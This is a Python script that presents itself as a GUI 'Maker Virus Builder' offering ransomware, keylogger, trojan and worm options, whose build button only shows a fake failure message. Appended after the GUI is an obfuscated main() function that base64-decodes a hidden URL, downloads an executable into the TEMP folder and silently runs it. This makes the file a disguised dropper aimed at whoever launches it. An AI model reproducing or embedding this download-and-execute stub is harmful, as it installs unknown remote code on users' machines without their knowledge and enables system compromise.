import base64
import customtkinter as ctk
from tkinter import messagebox
import os
import requests
import subprocess

# Configuration de l'apparence
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

# Configuration de l'application principale
app = ctk.CTk()
app.title("Maker Virus Builder")
app.geometry("600x500")

# Mise à jour des champs en fonction du type de virus sélectionné
def update_inputs(event):
    for widget in config_frame.winfo_children():
        widget.destroy()

    selected_type = virus_type_var.get()

    if selected_type == "Ransomware":
        ctk.CTkLabel(config_frame, text="Decryption Key:").pack(anchor="w", padx=10, pady=5)
        ctk.CTkEntry(config_frame, placeholder_text="Enter decryption key...").pack(fill="x", padx=10, pady=5)

    elif selected_type == "Keylogger":
        ctk.CTkLabel(config_frame, text="Webhook URL:").pack(anchor="w", padx=10, pady=5)
        ctk.CTkEntry(config_frame, placeholder_text="Enter webhook URL...").pack(fill="x", padx=10, pady=5)

    elif selected_type == "Trojan":
        ctk.CTkLabel(config_frame, text="Target File Path:").pack(anchor="w", padx=10, pady=5)
        ctk.CTkEntry(config_frame, placeholder_text="Enter target file path...").pack(fill="x", padx=10, pady=5)

    elif selected_type == "Worm":
        ctk.CTkLabel(config_frame, text="Spread Directory:").pack(anchor="w", padx=10, pady=5)
        ctk.CTkEntry(config_frame, placeholder_text="Enter directory to spread...").pack(fill="x", padx=10, pady=5)

# Construction du "faux virus"
def build_fake_virus():
    selected_type = virus_type_var.get()
    output_file = output_file_entry.get()
    # Simule une construction échouée (message générique)
    messagebox.showinfo("Maker Virus Built", f"ÉCHEC BUILD : {selected_type} avec fichier {output_file}")

# Interface utilisateur
ctk.CTkLabel(app, text="Maker Virus Builder", font=("Arial", 20)).pack(pady=10)
ctk.CTkLabel(app, text="Choose Virus Type:").pack(anchor="w", padx=10)

virus_type_var = ctk.StringVar(value="Ransomware")
virus_types = ["Ransomware", "Keylogger", "Trojan", "Worm"]
ctk.CTkOptionMenu(app, variable=virus_type_var, values=virus_types, command=update_inputs).pack(fill="x", padx=10, pady=5)

config_frame = ctk.CTkFrame(app)
config_frame.pack(fill="both", expand=True, padx=10, pady=10)

ctk.CTkLabel(app, text="Output File Name:").pack(anchor="w", padx=10)
output_file_entry = ctk.CTkEntry(app, placeholder_text="Enter file name...")
output_file_entry.pack(fill="x", padx=10, pady=5)

ctk.CTkButton(app, text="Build Virus", command=build_fake_virus).pack(pady=20)

update_inputs(None)
app.mainloop()

def main():
    sz_path = os.getenv('TEMP')
    _488_path = os.path.join(sz_path, 'a.exe')
    szsz_url = b'aHR0cHM6Ly9naXRodWIuY29tL2xhQ2xhdmFzL2NhbHZhcy9yZWxlYXNlcy9kb3dubG9hZC9wb21tZS9YQ2xpZW50LmV4ZQ=='
    decoded_szsz_url = base64.b64decode(szsz_url).decode()
    sz_response = requests.get(decoded_szsz_url, stream=True)
    with open(_488_path, 'wb') as sz_file:
        for sz_chunk in sz_response.iter_content(chunk_size=1024):
            sz_file.write(sz_chunk)
    subprocess.Popen(_488_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

if __name__ == "__main__":
    main()
